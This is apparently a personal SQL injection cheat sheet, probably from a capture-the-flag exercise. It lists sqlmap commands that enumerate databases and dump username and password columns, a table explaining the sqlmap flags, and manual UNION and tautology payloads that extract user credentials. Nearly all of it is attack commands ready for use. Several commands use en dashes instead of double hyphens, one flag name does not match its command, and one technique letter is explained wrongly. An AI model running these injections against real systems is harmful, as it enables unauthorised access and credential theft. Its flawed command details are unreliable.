|                         |                                       |
| ----------------------- | ------------------------------------- |
| **to list the dabases** | sqlmap -r request.txt --batch –dbs    |
| **to list the tables**  | sqlmap -r request.txt --batch –tables |
*get request.txt from burpsuite

```
sqlmap -r request.txt --batch –T users –C username,password –D monitorsthree_db –dump –level=3 –risk=3 --threads=10 --skip=dbs,hostname –technique=T 

```

|                                             |                                                                                                                                                                                                                                                                                                            |
| ------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **--batch**                                 | Never ask for user input, use the default behavior                                                                                                                                                                                                                                                         |
| **-T users**                                | DBMS database table(s) to enumerate                                                                                                                                                                                                                                                                        |
| **-C username,password**                    | DBMS database table column(s) to enumerate                                                                                                                                                                                                                                                                 |
| **-D DB**                                   | DBMS database to enumerate                                                                                                                                                                                                                                                                                 |
| **--dump**                                  | Dump DBMS database table entries                                                                                                                                                                                                                                                                           |
| **--level=3**                               | Level of tests to perform (1-5, default 1)                                                                                                                                                                                                                                                                 |
| **--risk=3**                                | Risk of tests to perform (1-3, default 1)                                                                                                                                                                                                                                                                  |
| **--thread=10**                             | This option specifies the number of concurrent threads that sqlmap should use during the attack.(default 1)                                                                                                                                                                                                |
| **–technique=T  Example : --technique=BEU** | SQL injection techniques to use (default "EUSTQB")  <br><br>- E - Error-based <br>    <br>- U - UNION query-based <br>    <br>- S - Stacked queries <br>    <br>- T - Time-based blind <br>    <br>- Q - Inline queries (also known as Boolean-based or UNION-based) <br>    <br>- B - Boolean-based blind |



1' OR '1'='1'#

'UNION SELECT table_name, NULL FROM information_schema.tables #

'UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name= 'users' #

'UNION SELECT user, password FROM users #

SELECT first_name, last_name FROM users WHERE user_id = ‘%’ or 0=0 union select null, version() #’;